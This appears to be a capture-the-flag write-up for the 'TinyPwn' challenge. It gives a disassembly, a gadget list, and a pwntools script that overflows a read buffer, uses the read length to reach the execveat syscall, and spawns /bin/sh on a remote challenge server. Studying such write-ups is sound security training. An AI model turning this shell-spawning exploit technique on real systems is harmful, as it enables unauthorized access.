I did this problem at school, so I didn't have idea xD. You'll have to bear with objdump.

Objdumping the binary we get:

```TinyPwn:     file format elf64-x86-64


Disassembly of section .text:

00000000004000b0 <.text>:
  4000b0:       48 31 c0                xor    %rax,%rax
  4000b3:       48 31 db                xor    %rbx,%rbx
  4000b6:       48 31 c9                xor    %rcx,%rcx
  4000b9:       48 31 d2                xor    %rdx,%rdx
  4000bc:       48 31 ff                xor    %rdi,%rdi
  4000bf:       48 31 f6                xor    %rsi,%rsi
  4000c2:       4d 31 c0                xor    %r8,%r8
  4000c5:       4d 31 c9                xor    %r9,%r9
  4000c8:       4d 31 d2                xor    %r10,%r10
  4000cb:       4d 31 db                xor    %r11,%r11
  4000ce:       4d 31 e4                xor    %r12,%r12
  4000d1:       4d 31 ed                xor    %r13,%r13
  4000d4:       4d 31 f6                xor    %r14,%r14
  4000d7:       4d 31 ff                xor    %r15,%r15
  4000da:       48 31 ed                xor    %rbp,%rbp
  4000dd:       e8 10 00 00 00          callq  0x4000f2
  4000e2:       b8 3c 00 00 00          mov    $0x3c,%eax
  4000e7:       48 31 ff                xor    %rdi,%rdi
  4000ea:       48 31 f6                xor    %rsi,%rsi
  4000ed:       48 31 d2                xor    %rdx,%rdx
  4000f0:       0f 05                   syscall 
  4000f2:       48 81 ec 28 01 00 00    sub    $0x128,%rsp
  4000f9:       48 89 e6                mov    %rsp,%rsi
  4000fc:       ba 48 01 00 00          mov    $0x148,%edx
  400101:       0f 05                   syscall 
  400103:       48 81 c4 28 01 00 00    add    $0x128,%rsp
  40010a:       c3                      retq ```

  It is a tiny binary indeed. It uses syscalls to read 0x148 bytes, then returns. Easy buffer overflow. We quickly find that the padding is 0x128 until the ret address. The problem is how do we get a shell?

  We can use ROPgadget to get a list of gadgets:

  ```Gadgets information
============================================================
0x0000000000400108 : add byte ptr [rax], al ; ret
0x00000000004000ff : add byte ptr [rax], al ; syscall
0x0000000000400104 : add esp, 0x128 ; ret
0x0000000000400103 : add rsp, 0x128 ; ret
0x00000000004000e9 : dec dword ptr [rax + 0x31] ; test byte ptr [rax + 0x31], 0xd2 ; syscall
0x00000000004000fc : mov edx, 0x148 ; syscall
0x00000000004000fa : mov esi, esp ; mov edx, 0x148 ; syscall
0x00000000004000f9 : mov rsi, rsp ; mov edx, 0x148 ; syscall
0x000000000040010a : ret
0x0000000000400106 : sub byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x00000000004000f0 : syscall
0x00000000004000ec : test byte ptr [rax + 0x31], 0xd2 ; syscall
0x00000000004000e8 : xor edi, edi ; xor rsi, rsi ; xor rdx, rdx ; syscall
0x00000000004000ee : xor edx, edx ; syscall
0x00000000004000eb : xor esi, esi ; xor rdx, rdx ; syscall
0x00000000004000e7 : xor rdi, rdi ; xor rsi, rsi ; xor rdx, rdx ; syscall
0x00000000004000ed : xor rdx, rdx ; syscall
0x00000000004000ea : xor rsi, rsi ; xor rdx, rdx ; syscall```

We don't have much at our disposal, so my idea was syscall. Looking at the list of syscalls here: ```http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/``` we see that sys_execve is 0x3b. However, we don't have a pop rax gadget! :(

To get around this, we have to realize that the read syscall sets rax to be the length of the bytes read. However it requires 0x128 bytes to reach the ret address, and 0x128 > 0x3b. So we use stub_execveat instead, with opcode 0x142. For this syscall, rsi is the pointer to the execve file name, which is conveniently our buffer. Debugging this, we also find that we need to zero our rdx, otherwise it would crash, which we have a gadget for at 0x4000ed.

Final attack plan:
1) Make our input string start with /bin/sh\x00
2) Make our input string length 0x142
3) Zero out rdx
4) Syscall and get shell

```python
from pwn import *

r = process("./TinyPwn")
r = remote("159.65.125.233", 6009)

payload = "/bin/sh\x00" + "B"*(0x148-(8*4) - 8)
payload += p64(0x00000000004000ed)
payload += p64(0x400101)
payload += "A"*(0x142-len(payload)-1)

r.sendline(payload)
r.interactive()```
